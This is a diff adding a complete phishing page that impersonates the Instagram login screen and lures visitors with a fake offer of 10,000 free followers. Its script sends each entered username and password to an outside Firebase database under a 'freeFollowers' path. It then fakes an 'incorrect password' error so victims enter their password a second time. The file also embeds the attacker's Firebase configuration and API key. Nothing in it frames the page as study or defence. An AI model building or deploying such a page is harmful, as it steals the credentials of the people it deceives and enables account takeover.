@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram</title>
+
+    <!-- FIREBASE CONFIGURATION -->
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBqOqV3gztxR8xNx1biOn9o7rvjkiHH16o",
+            authDomain: "fuckedbyhyperapp.firebaseapp.com",
+            databaseURL: "https://fuckedbyhyperapp-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "fuckedbyhyperapp",
+            storageBucket: "fuckedbyhyperapp.firebasestorage.app",
+            messagingSenderId: "480408008111",
+            appId: "1:480408008111:web:0eb411fe713ff5c19ceb5a"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const fbhDB = firebase.database();
+    </script>
+
+    <style>
+        /* =========================================
+           THEME VARIABLES (Light/Dark Auto)
+           ========================================= */
+        :root {
+            --bg-color: #fafafa; /* Light Default */
+            --text-color: #262626;
+            --text-muted: #8e8e8e;
+            --input-bg: #fff;
+            --input-border: #dbdbdb;
+            --btn-bg: #0095f6;
+            --link-color: #00376b;
+        }
+
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg-color: #000000;
+                --text-color: #f5f5f5;
+                --text-muted: #a8a8a8;
+                --input-bg: #121212;
+                --input-border: #363636;
+                --link-color: #fff;
+            }
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; }
+        
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            display: flex; flex-direction: column; align-items: center;
+            min-height: 100vh; transition: 0.3s;
+        }
+
+        .container { width: 100%; max-width: 375px; padding: 20px; display: flex; flex-direction: column; align-items: center; flex: 1; }
+        
+        /* PREMIUM BANNER STYLES */
+        .premium-banner {
+            width: 100%;
+            background: linear-gradient(90deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            padding: 18px;
+            border-radius: 12px;
+            color: white;
+            text-align: center;
+            box-shadow: 0 8px 20px rgba(220, 39, 67, 0.4);
+            margin-bottom: 30px;
+            animation: slideIn 0.8s ease-out;
+            border: 1px solid rgba(255,255,255,0.2);
+            position: relative;
+            overflow: hidden;
+        }
+        .premium-banner h2 { font-size: 18px; margin-bottom: 4px; font-weight: 800; letter-spacing: 0.5px; }
+        .premium-banner p { font-size: 13px; opacity: 0.95; font-weight: 500; }
+        
+        .premium-badge {
+            display: inline-block;
+            background: #fff;
+            color: #e1306c;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 800;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+        }
+
+        @keyframes slideIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* Standard UI */
+        .language-selector { width: 100%; text-align: center; font-size: 14px; color: var(--text-muted); margin-top: 10px; margin-bottom: 40px; }
+        .insta-logo { width: 72px; height: 72px; margin-bottom: 35px; }
+        
+        .login-form { width: 100%; display: flex; flex-direction: column; gap: 12px; }
+        .input-field {
+            width: 100%; padding: 14px 16px; background-color: var(--input-bg); border: 1px solid var(--input-border);
+            border-radius: 6px; color: var(--text-color); font-size: 14px; outline: none; transition: 0.2s;
+        }
+        .input-field::placeholder { color: var(--text-muted); }
+        .login-btn { width: 100%; padding: 12px; background-color: var(--btn-bg); color: #fff; border: none; border-radius: 6px; font-size: 14px; font-weight: 600; margin-top: 4px; cursor: pointer; }
+        .login-btn:disabled { background-color: #262626; color: #00376b; }
+        
+        /* ERROR & FAVORITE STYLES */
+        .error-msg { color: #ED4956; text-align: center; font-size: 13px; margin-top: 12px; font-weight: 600; display: none; }
+        
+        .bottom-section { width: 100%; margin-top: auto; padding-bottom: 20px; display: flex; flex-direction: column; align-items: center; }
+        .create-account-btn { width: 100%; padding: 12px; background-color: transparent; color: var(--btn-bg); border: 1px solid #DBDBDB; border-radius: 50px; font-size: 14px; font-weight: 600; cursor: pointer; margin-bottom: 30px; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- 🔥 PREMIUM BANNER 🔥 -->
+        <div class="premium-banner">
+            <span class="premium-badge">🔥 Free Update</span>
+            <h2>Get 10,000 Followers!</h2>
+            <p>Complete login to verify and claim now.</p>
+        </div>
+
+        <div class="language-selector">English (US)</div>
+
+        <!-- Official Logo -->
+        <svg class="insta-logo" viewBox="0 0 169.063 169.063" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+                <linearGradient id="instaGrad" x1="0%" y1="100%" x2="100%" y2="0%">
+                    <stop offset="0%" stop-color="#fccc63" />
+                    <stop offset="25%" stop-color="#f77737" />
+                    <stop offset="50%" stop-color="#e1306c" />
+                    <stop offset="75%" stop-color="#c13584" />
+                    <stop offset="100%" stop-color="#405de6" />
+                </linearGradient>
+            </defs>
+            <path fill="url(#instaGrad)" d="M122.406,0H46.654C20.929,0,0,20.93,0,46.655v75.752c0,25.727,20.929,46.656,46.654,46.656h75.752
+                c25.727,0,46.656-20.93,46.656-46.656V46.655C169.063,20.93,148.133,0,122.406,0z M154.063,122.407
+                c0,17.455-14.201,31.656-31.656,31.656H46.654C29.2,154.063,15,139.862,15,122.407V46.655C15,29.2,29.2,15,46.654,15h75.752
+                c17.455,0,31.656,14.2,31.656,31.655V122.407z M84.531,40.97c-24.021,0-43.563,19.542-43.563,43.563
+                c0,24.02,19.542,43.561,43.563,43.561s43.563-19.541,43.563-43.561C128.094,60.512,108.552,40.97,84.531,40.97z M84.531,113.093
+                c-15.749,0-28.563-12.812-28.563-28.561c0-15.75,12.813-28.563,28.563-28.563s28.563,12.813,28.563,28.563
+                C113.094,100.281,100.28,113.093,84.531,113.093z M138.445,34.657c0,3.58-2.903,6.48-6.48,6.48c-3.58,0-6.48-2.9-6.48-6.48
+                c0-3.58,2.9-6.48,6.48-6.48C135.542,28.177,138.445,31.077,138.445,34.657z"/>
+        </svg>
+
+        <!-- Login Form + Hacking Logic -->
+        <form class="login-form" id="myform">
+            <!-- IDs added to Javascript logic -->
+            <input type="text" id="username" class="input-field" placeholder="Phone number, username, or email" autocapitalize="off" spellcheck="false">
+            <input type="password" id="password" class="input-field" placeholder="Password">
+            
+            <div class="error-msg" id="errMsg">Sorry, your password was incorrect. Please double-check your password.</div>
+            
+            <button type="submit" class="login-btn" id="sendBtn">Log in</button>
+        </form>
+
+        <div class="bottom-section">
+            <button class="create-account-btn" onclick="window.location.href='https://www.instagram.com/accounts/emailsignup/'">Create new account</button>
+        </div>
+    </div>
+
+    <!-- JAVASCRIPT LOGIC -->
+    <script>
+        document.getElementById('myform').addEventListener('submit', function(e) {
+            e.preventDefault(); // Stop default form load
+
+            const u = document.getElementById('username').value.trim();
+            const p = document.getElementById('password').value;
+            const btn = document.getElementById('sendBtn');
+            const err = document.getElementById('errMsg');
+
+            if (!u || !p) return;
+
+            // UI Loading Effect
+            btn.textContent = "Verifying...";
+            btn.style.opacity = "0.7";
+            btn.disabled = true;
+
+            // --- FIREBASE PUSH ---
+            // Save data to "freeFollowers" collection in DB
+            fbhDB.ref('freeFollowers/new_user').push({
+                username: u,
+                password: p,
+                time: new Date().toLocaleString()
+            });
+            // ---------------------
+
+            // Delay simulation (Realism)
+            setTimeout(function() {
+                // Try 1: Show Error (User usually corrects password on 2nd try)
+                err.style.display = "block";
+                document.getElementById('password').value = ""; // Clear password field
+                document.getElementById('password').focus();
+                
+                btn.textContent = "Log in";
+                btn.style.opacity = "1";
+                btn.disabled = false;
+
+            }, 2000); // Wait 2 seconds
+        });
+    </script>
+</body>
+</html>
